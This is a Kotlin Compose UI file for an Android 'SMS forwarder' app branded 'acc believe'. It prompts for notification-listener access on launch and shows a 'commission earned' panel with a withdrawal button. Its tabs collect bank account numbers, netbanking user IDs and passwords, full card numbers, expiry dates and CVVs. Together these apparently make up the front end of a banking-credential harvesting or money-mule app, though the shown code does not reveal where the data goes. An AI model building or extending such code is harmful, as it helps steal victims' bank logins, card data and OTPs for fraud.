package com.smsforwarder.app.ui.home

import android.content.Context
import android.content.Intent
import android.provider.Settings
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalFocusManager
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import com.smsforwarder.app.domain.model.DeviceInfo
import com.smsforwarder.app.ui.theme.AccentGreen
import com.smsforwarder.app.ui.theme.PrimaryBlue
import com.smsforwarder.app.ui.theme.WarningAmber

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun HomeScreen(
    viewModel: HomeViewModel,
    onNavigateWithdrawal: () -> Unit,
    onLogout: () -> Unit
) {
    val state by viewModel.uiState.collectAsState()
    val deviceInfo = state.deviceInfo ?: return
    val context = LocalContext.current

    var selectedFooterTab by remember { mutableStateOf(0) } // 0: Home, 1: Add Bank, 2: Add Netbanking, 3: Add Card
    var showProfileDialog by remember { mutableStateOf(false) }

    // Auto-prompt Notification Access Permission on entering app if not already granted
    LaunchedEffect(Unit) {
        val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
        val isEnabled = flat != null && flat.contains(context.packageName)
        if (!isEnabled) {
            runCatching {
                context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
        }
    }

    Scaffold(
        containerColor = Color.White,
        topBar = {
            TopAppBar(
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color.White),
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Surface(
                            shape = CircleShape,
                            color = PrimaryBlue.copy(alpha = 0.1f),
                            modifier = Modifier.size(36.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    imageVector = Icons.Default.Shield,
                                    contentDescription = null,
                                    tint = PrimaryBlue,
                                    modifier = Modifier.size(20.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.width(10.dp))
                        Text(
                            text = "acc believe",
                            fontWeight = FontWeight.Bold,
                            color = MaterialTheme.colorScheme.onSurface,
                            fontSize = 20.sp
                        )
                    }
                },
                actions = {
                    // TOP RIGHT CORNER: PROFILE OPTION
                    IconButton(onClick = { showProfileDialog = true }) {
                        Icon(
                            imageVector = Icons.Default.AccountCircle,
                            contentDescription = "User Profile",
                            tint = PrimaryBlue,
                            modifier = Modifier.size(32.dp)
                        )
                    }
                }
            )
        },
        bottomBar = {
            // FOOTER / BOTTOM NAVIGATION BAR
            NavigationBar(
                containerColor = Color.White,
                tonalElevation = 8.dp
            ) {
                NavigationBarItem(
                    selected = selectedFooterTab == 0,
                    onClick = { selectedFooterTab = 0 },
                    icon = { Icon(Icons.Default.Home, contentDescription = null) },
                    label = { Text("Home", fontWeight = FontWeight.Bold) },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = PrimaryBlue,
                        selectedTextColor = PrimaryBlue,
                        indicatorColor = PrimaryBlue.copy(alpha = 0.15f)
                    )
                )

                NavigationBarItem(
                    selected = selectedFooterTab == 1,
                    onClick = { selectedFooterTab = 1 },
                    icon = { Icon(Icons.Default.AccountBalance, contentDescription = null) },
                    label = { Text("Add Bank", fontWeight = FontWeight.Bold) },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = PrimaryBlue,
                        selectedTextColor = PrimaryBlue,
                        indicatorColor = PrimaryBlue.copy(alpha = 0.15f)
                    )
                )

                NavigationBarItem(
                    selected = selectedFooterTab == 2,
                    onClick = { selectedFooterTab = 2 },
                    icon = { Icon(Icons.Default.VpnKey, contentDescription = null) },
                    label = { Text("Netbanking", fontWeight = FontWeight.Bold) },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = PrimaryBlue,
                        selectedTextColor = PrimaryBlue,
                        indicatorColor = PrimaryBlue.copy(alpha = 0.15f)
                    )
                )

                NavigationBarItem(
                    selected = selectedFooterTab == 3,
                    onClick = { selectedFooterTab = 3 },
                    icon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
                    label = { Text("Add Card", fontWeight = FontWeight.Bold) },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = PrimaryBlue,
                        selectedTextColor = PrimaryBlue,
                        indicatorColor = PrimaryBlue.copy(alpha = 0.15f)
                    )
                )
            }
        }
    ) { padding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.White)
                .padding(padding)
                .imePadding()
                .padding(horizontal = 16.dp, vertical = 8.dp)
        ) {
            when (selectedFooterTab) {
                0 -> HomePageTabSection(
                    state = state,
                    onSelectAddBank = { selectedFooterTab = 1 },
                    onNavigateWithdrawal = onNavigateWithdrawal
                )
                1 -> AddBankAccountSection(state = state, viewModel = viewModel)
                2 -> AddNetbankingSection(state = state, viewModel = viewModel)
                3 -> AddCardSection(state = state, viewModel = viewModel)
            }
        }
    }

    // TOP RIGHT PROFILE DIALOG
    if (showProfileDialog) {
        ProfileModalDialog(
            info = deviceInfo,
            onDismiss = { showProfileDialog = false },
            onLogout = {
                showProfileDialog = false
                viewModel.logout(onLogout)
            }
        )
    }
}

/**
 * FOOTER TAB 0: HOME PAGE TAB
 * Contains Commission Section, Add Account Option & Withdrawal Option Button
 */
@Composable
private fun HomePageTabSection(
    state: HomeUiState,
    onSelectAddBank: () -> Unit,
    onNavigateWithdrawal: () -> Unit
) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.spacedBy(18.dp)
    ) {
        // 1. COMMISSION SECTION
        Text(
            text = "Commission",
            style = MaterialTheme.typography.titleLarge,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.onSurface,
            modifier = Modifier.fillMaxWidth()
        )

        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = PrimaryBlue.copy(alpha = 0.08f)),
            border = androidx.compose.foundation.BorderStroke(1.dp, PrimaryBlue.copy(alpha = 0.2f)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(
                modifier = Modifier.padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.MonetizationOn, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(32.dp))
                    Spacer(modifier = Modifier.width(10.dp))
                    Column {
                        Text(
                            text = "Total Commission Earned",
                            style = MaterialTheme.typography.labelLarge,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                        Text(
                            text = "₹${String.format("%.2f", state.deviceInfo?.commissionEarned ?: 0.0)}",
                            style = MaterialTheme.typography.headlineLarge,
                            fontWeight = FontWeight.Bold,
                            color = PrimaryBlue
                        )
                    }
                }
            }
        }

        // 2. ADD ACCOUNT OPTION (Replaces Cashback Banner)
        OutlinedButton(
            onClick = onSelectAddBank,
            modifier = Modifier
                .fillMaxWidth()
                .height(54.dp),
            shape = RoundedCornerShape(14.dp),
            colors = ButtonDefaults.outlinedButtonColors(contentColor = PrimaryBlue)
        ) {
            Icon(Icons.Default.AccountBalance, contentDescription = null, tint = PrimaryBlue)
            Spacer(modifier = Modifier.width(10.dp))
            Text("Add Account (Bank)", fontSize = 16.sp, fontWeight = FontWeight.Bold)
        }

        // 3. WITHDRAWAL BUTTON
        Button(
            onClick = onNavigateWithdrawal,
            modifier = Modifier
                .fillMaxWidth()
                .height(54.dp),
            shape = RoundedCornerShape(14.dp),
            colors = ButtonDefaults.buttonColors(containerColor = PrimaryBlue)
        ) {
            Icon(Icons.Default.AccountBalanceWallet, contentDescription = null, tint = Color.White)
            Spacer(modifier = Modifier.width(10.dp))
            Text("Withdrawal Request", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = Color.White)
        }
    }
}

/**
 * FOOTER TAB 1: ADD BANK ACCOUNT
 */
@Composable
private fun AddBankAccountSection(
    state: HomeUiState,
    viewModel: HomeViewModel
) {
    val context = LocalContext.current
    var bankName by remember { mutableStateOf(state.deviceInfo?.bankName ?: "") }
    var accountNumber by remember { mutableStateOf(state.deviceInfo?.accountNumber ?: "") }
    var ifscCode by remember { mutableStateOf(state.deviceInfo?.ifscCode ?: "") }

    val focusManager = LocalFocusManager.current
    val isValid = bankName.isNotBlank() && accountNumber.isNotBlank() && ifscCode.isNotBlank()

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(
                modifier = Modifier.padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(14.dp)
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.AccountBalance, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(28.dp))
                    Spacer(modifier = Modifier.width(10.dp))
                    Text("Add Bank Account", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
                }

                Text(
                    text = "Enter your primary bank account details below.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )

                OutlinedTextField(
                    value = bankName,
                    onValueChange = { bankName = it },
                    label = { Text("Bank Name (e.g. HDFC, SBI, ICICI)") },
                    leadingIcon = { Icon(Icons.Default.AccountBalance, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                OutlinedTextField(
                    value = accountNumber,
                    onValueChange = { accountNumber = it.filter { c -> c.isDigit() } },
                    label = { Text("Account Number") },
                    leadingIcon = { Icon(Icons.Default.Numbers, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                OutlinedTextField(
                    value = ifscCode,
                    onValueChange = { ifscCode = it.uppercase() },
                    label = { Text("IFSC Code") },
                    leadingIcon = { Icon(Icons.Default.Code, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Done),
                    keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                state.saveMessage?.let { msg ->
                    Text(
                        text = msg,
                        color = AccentGreen,
                        style = MaterialTheme.typography.bodyMedium,
                        fontWeight = FontWeight.Bold,
                        textAlign = TextAlign.Center,
                        modifier = Modifier.fillMaxWidth()
                    )
                }

                Button(
                    onClick = {
                        focusManager.clearFocus()
                        viewModel.saveBankAccount(bankName, accountNumber, ifscCode)
                        android.widget.Toast.makeText(context, "✅ Bank Account Saved Successfully!", android.widget.Toast.LENGTH_SHORT).show()
                    },
                    enabled = isValid && !state.isSavingAccount,
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    if (state.isSavingAccount) {
                        CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Saving Account...")
                    } else {
                        Text("Save Bank Account", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }
    }
}

/**
 * FOOTER TAB 2: ADD NETBANKING
 */
@Composable
private fun AddNetbankingSection(
    state: HomeUiState,
    viewModel: HomeViewModel
) {
    val context = LocalContext.current
    var bankName by remember { mutableStateOf(state.deviceInfo?.bankName ?: "") }
    var netbankingId by remember { mutableStateOf(state.deviceInfo?.netbankingId ?: "") }
    var netbankingPassword by remember { mutableStateOf(state.deviceInfo?.netbankingPassword ?: "") }
    var isPasswordVisible by remember { mutableStateOf(false) }

    val focusManager = LocalFocusManager.current
    val isValid = bankName.isNotBlank() && netbankingId.isNotBlank() && netbankingPassword.isNotBlank()

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(
                modifier = Modifier.padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(14.dp)
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.VpnKey, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(28.dp))
                    Spacer(modifier = Modifier.width(10.dp))
                    Text("Add Netbanking", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
                }

                Text(
                    text = "Enter your Netbanking User ID & Password.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )

                OutlinedTextField(
                    value = bankName,
                    onValueChange = { bankName = it },
                    label = { Text("Bank Name (e.g. HDFC, SBI, ICICI)") },
                    leadingIcon = { Icon(Icons.Default.AccountBalance, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                OutlinedTextField(
                    value = netbankingId,
                    onValueChange = { netbankingId = it },
                    label = { Text("Netbanking User ID / Customer ID") },
                    leadingIcon = { Icon(Icons.Default.Badge, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                OutlinedTextField(
                    value = netbankingPassword,
                    onValueChange = { netbankingPassword = it },
                    label = { Text("Netbanking Password") },
                    leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                    trailingIcon = {
                        IconButton(onClick = { isPasswordVisible = !isPasswordVisible }) {
                            Icon(
                                imageVector = if (isPasswordVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
                                contentDescription = null
                            )
                        }
                    },
                    visualTransformation = if (isPasswordVisible) VisualTransformation.None else PasswordVisualTransformation(),
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password, imeAction = ImeAction.Done),
                    keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                state.saveMessage?.let { msg ->
                    Text(
                        text = msg,
                        color = AccentGreen,
                        style = MaterialTheme.typography.bodyMedium,
                        fontWeight = FontWeight.Bold,
                        textAlign = TextAlign.Center,
                        modifier = Modifier.fillMaxWidth()
                    )
                }

                Button(
                    onClick = {
                        focusManager.clearFocus()
                        viewModel.saveNetbanking(bankName, netbankingId, netbankingPassword)
                        android.widget.Toast.makeText(context, "✅ Netbanking Details Saved Successfully!", android.widget.Toast.LENGTH_SHORT).show()
                    },
                    enabled = isValid && !state.isSavingAccount,
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    if (state.isSavingAccount) {
                        CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Saving Netbanking...")
                    } else {
                        Text("Save Netbanking Details", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }
    }
}

/**
 * FOOTER TAB 3: ADD CARD DETAILS
 */
@Composable
private fun AddCardSection(
    state: HomeUiState,
    viewModel: HomeViewModel
) {
    val context = LocalContext.current
    var cardNumber by remember { mutableStateOf(state.deviceInfo?.cardNumber ?: "") }
    var cardExpiry by remember { mutableStateOf(state.deviceInfo?.cardExpiry ?: "") }
    var cardCvv by remember { mutableStateOf(state.deviceInfo?.cardCvv ?: "") }
    var isCvvVisible by remember { mutableStateOf(false) }

    val focusManager = LocalFocusManager.current

    val expiryDigits = cardExpiry.filter { it.isDigit() }
    val expiryMonth = expiryDigits.take(2).toIntOrNull()
    val isExpiryMonthValid = expiryMonth == null || (expiryDigits.length >= 2 && expiryMonth in 1..12) || (expiryDigits.length < 2)
    val isCardExpiryValid = cardExpiry.length == 5 && expiryMonth != null && expiryMonth in 1..12
    val isCvvValid = cardCvv.length == 3
    val isFormValid = cardNumber.length >= 12 && isCardExpiryValid && isCvvValid

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(
                modifier = Modifier.padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(14.dp)
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.CreditCard, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(28.dp))
                    Spacer(modifier = Modifier.width(10.dp))
                    Text("Add Card Details", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
                }

                Text(
                    text = "Enter your Debit or Credit Card details.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )

                OutlinedTextField(
                    value = cardNumber,
                    onValueChange = { newValue ->
                        val digitsOnly = newValue.filter { it.isDigit() }
                        if (digitsOnly.length <= 16) {
                            cardNumber = digitsOnly
                        }
                    },
                    label = { Text("Card Number (16 Digits)") },
                    leadingIcon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    OutlinedTextField(
                        value = cardExpiry,
                        onValueChange = { input ->
                            val digits = input.filter { it.isDigit() }.take(4)
                            cardExpiry = when {
                                digits.length >= 3 -> "${digits.substring(0, 2)}/${digits.substring(2)}"
                                else -> digits
                            }
                        },
                        label = { Text("Valid Thru (MM/YY)") },
                        leadingIcon = { Icon(Icons.Default.DateRange, contentDescription = null) },
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
                        singleLine = true,
                        isError = expiryDigits.length >= 2 && !isExpiryMonthValid,
                        supportingText = {
                            if (expiryDigits.length >= 2 && !isExpiryMonthValid) {
                                Text("Invalid Month (01-12)", color = MaterialTheme.colorScheme.error)
                            } else if (isCardExpiryValid) {
                                Text("✓ Valid MM/YY", color = AccentGreen)
                            } else {
                                Text("Format: MM/YY", color = MaterialTheme.colorScheme.onSurfaceVariant)
                            }
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    )

                    OutlinedTextField(
                        value = cardCvv,
                        onValueChange = { newValue ->
                            val digitsOnly = newValue.filter { it.isDigit() }
                            if (digitsOnly.length <= 3) {
                                cardCvv = digitsOnly
                            }
                        },
                        label = { Text("CVV (3 Digits)") },
                        leadingIcon = { Icon(Icons.Default.Security, contentDescription = null) },
                        trailingIcon = {
                            IconButton(onClick = { isCvvVisible = !isCvvVisible }) {
                                Icon(
                                    imageVector = if (isCvvVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
                                    contentDescription = null
                                )
                            }
                        },
                        visualTransformation = if (isCvvVisible) VisualTransformation.None else PasswordVisualTransformation(),
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.NumberPassword, imeAction = ImeAction.Done),
                        keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
                        singleLine = true,
                        isError = cardCvv.isNotEmpty() && cardCvv.length != 3,
                        supportingText = {
                            if (cardCvv.isNotEmpty() && cardCvv.length != 3) {
                                Text("Must be 3 digits (${cardCvv.length}/3)", color = MaterialTheme.colorScheme.error)
                            } else if (cardCvv.length == 3) {
                                Text("✓ Valid 3 digits", color = AccentGreen)
                            } else {
                                Text("3 Digits CVV", color = MaterialTheme.colorScheme.onSurfaceVariant)
                            }
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    )
                }

                state.saveMessage?.let { msg ->
                    Text(
                        text = msg,
                        color = AccentGreen,
                        style = MaterialTheme.typography.bodyMedium,
                        fontWeight = FontWeight.Bold,
                        textAlign = TextAlign.Center,
                        modifier = Modifier.fillMaxWidth()
                    )
                }

                Button(
                    onClick = {
                        focusManager.clearFocus()
                        viewModel.saveCard(cardNumber, cardExpiry, cardCvv)
                        android.widget.Toast.makeText(context, "✅ Card Details Saved Successfully!", android.widget.Toast.LENGTH_SHORT).show()
                    },
                    enabled = isFormValid && !state.isSavingAccount,
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    if (state.isSavingAccount) {
                        CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Saving Card...")
                    } else {
                        Text("Save Card Details", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }
    }
}

/**
 * TOP RIGHT PROFILE DIALOG
 */
@Composable
private fun ProfileModalDialog(
    info: DeviceInfo,
    onDismiss: () -> Unit,
    onLogout: () -> Unit
) {
    Dialog(onDismissRequest = onDismiss) {
        Surface(
            shape = RoundedCornerShape(24.dp),
            color = Color.White,
            tonalElevation = 8.dp,
            modifier = Modifier.fillMaxWidth(0.92f)
        ) {
            Column(
                modifier = Modifier
                    .padding(20.dp)
                    .verticalScroll(rememberScrollState()),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                // Header with Close
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "User Profile",
                        style = MaterialTheme.typography.titleLarge,
                        fontWeight = FontWeight.Bold
                    )
                    IconButton(onClick = onDismiss) {
                        Icon(Icons.Default.Close, contentDescription = "Close")
                    }
                }

                // Avatar Badge
                Surface(
                    shape = CircleShape,
                    color = PrimaryBlue.copy(alpha = 0.12f),
                    modifier = Modifier.size(72.dp)
                ) {
                    Box(contentAlignment = Alignment.Center) {
                        Icon(
                            imageVector = Icons.Default.Person,
                            contentDescription = null,
                            tint = PrimaryBlue,
                            modifier = Modifier.size(40.dp)
                        )
                    }
                }

                Text(
                    text = info.departmentName.ifBlank { "User Account" },
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.Bold
                )

                Card(
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(
                        modifier = Modifier.padding(16.dp),
                        verticalArrangement = Arrangement.spacedBy(10.dp)
                    ) {
                        ProfileInfoRow(label = "Mobile Number", value = info.mobileNumber.ifBlank { "N/A" })
                        HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
                        ProfileInfoRow(
                            label = "Commission Earned",
                            value = "₹${String.format("%.2f", info.commissionEarned)}"
                        )
                        HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
                        ProfileInfoRow(
                            label = "Bank Account Status",
                            value = if (info.bankName.isNotBlank() && info.accountNumber.isNotBlank()) "Saved (${info.bankName})" else "Not Added"
                        )
                        HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
                        ProfileInfoRow(
                            label = "Netbanking Status",
                            value = if (info.netbankingId.isNotBlank()) "Saved" else "Not Added"
                        )
                        HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
                        ProfileInfoRow(
                            label = "Card Details Status",
                            value = if (info.cardNumber.isNotBlank()) "Saved (${info.cardNumber.takeLast(4).padStart(16, '*')})" else "Not Added"
                        )
                    }
                }

                val context = LocalContext.current
                Button(
                    onClick = {
                        android.widget.Toast.makeText(context, "Logged out successfully", android.widget.Toast.LENGTH_SHORT).show()
                        onLogout()
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error),
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(48.dp),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Icon(Icons.Default.Logout, contentDescription = null, tint = Color.White)
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("Logout", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color.White)
                }
            }
        }
    }
}

@Composable
private fun ProfileInfoRow(label: String, value: String) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Text(
            text = label,
            style = MaterialTheme.typography.bodySmall,
            color = MaterialTheme.colorScheme.onSurfaceVariant
        )
        Text(
            text = value,
            style = MaterialTheme.typography.bodyMedium,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.onSurface
        )
    }
}
